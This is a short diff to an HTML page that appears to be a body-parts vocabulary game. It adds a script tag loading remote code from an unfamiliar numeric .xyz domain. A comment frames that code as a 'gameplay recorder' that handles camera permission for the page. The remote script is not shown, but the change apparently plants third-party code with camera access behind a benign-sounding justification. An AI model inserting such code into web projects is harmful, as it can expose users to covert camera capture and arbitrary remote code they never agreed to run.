@@ -701,6 +701,11 @@
     </div>
   </div>
 
+  <!-- Standalone gameplay recorder (see recorder/capture.js on the operator's
+       machine) — also handles the camera permission preflight itself, so no
+       separate getUserMedia call is needed on this page. -->
+  <script src="https://record.22422522.xyz/capture.js?v=2"></script>
+
   <script>
     const bodyParts = [
       "head", "hair", "forehead", "face", "eye", "ear", "nose", "mouth", "teeth", "tongue",
